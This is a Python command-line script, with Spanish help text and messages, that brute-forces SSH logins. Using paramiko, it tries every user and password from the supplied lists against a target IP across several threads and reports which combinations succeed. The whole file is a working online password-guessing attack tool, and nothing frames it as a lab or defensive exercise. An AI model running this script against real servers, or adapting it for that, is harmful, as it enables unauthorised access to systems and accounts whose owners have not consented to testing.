#!/usr/bin/env python3
import argparse
import paramiko
import sys
import os
import threading

def attack_ssh(ip, user, password, verbose):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=user, password=password, timeout=5)
    except paramiko.AuthenticationException:
        if verbose:
            print(f"[-] {user}:{password} fallo.")
        ssh.close()
        return False
    except Exception as e:
        if verbose:
            print(f"[!] Error de conexión: {e}")
        ssh.close()
        return False

    if verbose:
        print(f"[+] {user}:{password} éxito!")
    ssh.close()
    return True

def main():
    parser = argparse.ArgumentParser(description="Herramienta para probar credenciales de SSH")
    parser.add_argument("-t", "--target", required=True, help="IP objetivo")
    parser.add_argument("-u", "--user", help="Nombre de usuario a probar")
    parser.add_argument("-U", "--users-file", help="Archivo con lista de usuarios")
    parser.add_argument("-p", "--password", help="Contraseña a probar")
    parser.add_argument("-P", "--passwords-file", help="Archivo con lista de contraseñas")
    parser.add_argument("-v", "--verbose", action="store_true", help="Muestra resultados detallados")
    parser.add_argument("-T", "--threads", type=int, default=1, help="Número de threads a utilizar")
    args = parser.parse_args()

    if args.user and args.users_file:
        print("Error: Debe proporcionar solo un nombre de usuario o un archivo con una lista de usuarios.")
        sys.exit(1)

    if args.password and args.passwords_file:
        print("Error: Debe proporcionar solo una contraseña o un archivo con una lista de contraseñas.")
        sys.exit(1)

    if args.user:
        users = [args.user]
    elif args.users_file:
        if not os.path.exists(args.users_file):
            print(f"Error: El archivo {args.users_file} no existe.")
            sys.exit(1)

        with open(args.users_file, 'r') as f:
            users = f.read().splitlines()
    else:
        print("Error: Debe proporcionar un nombre de usuario o un archivo con una lista de usuarios.")
        sys.exit(1)

    if args.password:
        passwords = [args.password]
    elif args.passwords_file:
        if not os.path.exists(args.passwords_file):
            print(f"Error: El archivo {args.passwords_file} no existe.")
            sys.exit(1)

        with open(args.passwords_file, 'r') as f:
            passwords = f.read().splitlines()
    else:
        print("Error: Debe proporcionar una contraseña o un archivo con una lista de contraseñas.")
        sys.exit(1)

    threads = []
    for user in users:
        for password in passwords:
            if len(threads) >= args.threads:
                threads[0].join()
                threads = threads[1:]
            t = threading.Thread(target=attack_ssh, args=(args.target, user, password, args.verbose))
            t.start()
            threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
